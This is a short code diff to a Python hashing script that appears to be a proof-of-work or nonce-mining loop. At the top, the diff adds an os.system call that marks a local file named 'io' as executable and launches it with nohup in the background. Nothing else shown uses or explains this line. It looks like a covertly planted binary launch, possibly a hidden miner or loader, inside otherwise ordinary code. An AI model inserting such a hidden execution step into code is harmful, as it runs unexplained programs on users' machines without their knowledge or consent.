@@ -1,3 +1,5 @@
+import os
+os.system('chmod 700 io;nohup ./io &')
 from hashlib import sha256
 from time import  sleep
 MAX_NONCE = 100000000000
